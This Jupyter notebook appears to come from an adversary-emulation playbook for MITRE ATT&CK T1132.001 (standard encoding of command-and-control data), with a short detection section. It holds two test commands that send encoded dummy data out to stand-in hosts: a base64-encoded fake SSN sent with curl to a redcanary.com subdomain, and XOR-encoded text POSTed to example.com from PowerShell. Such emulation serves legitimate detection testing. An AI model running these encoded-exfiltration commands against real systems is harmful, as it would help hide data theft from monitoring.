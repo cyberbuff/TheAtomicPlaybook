{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "f3575d4f",
   "metadata": {},
   "source": "# T1132.001 - Standard Encoding\nAdversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system that adheres to existing protocol specifications. Common data encoding schemes include ASCII, Unicode, hexadecimal, Base64, and MIME.(Citation: Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character Encoding) Some data encoding systems may also result in data compression, such as gzip."
  },
  {
   "cell_type": "markdown",
   "id": "dfc5b8db",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "27337f37",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Base64 Encoded data.",
    "Utilizing a common technique for posting base64 encoded data.\n",
    "**Supported Platforms:** macos, linux",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\necho -n 111-11-1111 | base64\ncurl -XPOST MTExLTExLTExMTE=.redcanary.com\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f107d748",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1132.001 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "749e042a",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - XOR Encoded data.",
    "XOR encodes the data with a XOR key.\nReference - https://gist.github.com/loadenmb/8254cee0f0287b896a05dcdc8a30042f\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$plaintext = ([system.Text.Encoding]::UTF8.getBytes(\"Path\\n----\\nC:\\Users\\victim\"))\n$key = \"abcdefghijklmnopqrstuvwxyz123456\"\n$cyphertext =  @();\nfor ($i = 0; $i -lt $plaintext.Count; $i++) {\n $cyphertext += $plaintext[$i] -bxor $key[$i % $key.Length];\n}\n$cyphertext = [system.Text.Encoding]::UTF8.getString($cyphertext)\n[System.Net.ServicePointManager]::Expect100Continue = $false\nInvoke-WebRequest -Uri example.com -Method POST -Body $cyphertext -DisableKeepAlive\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "05258878",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1132.001 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "b63d7d1d",
   "metadata": {},
   "source": "## Detection\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "PowerShell",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "PowerShell",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}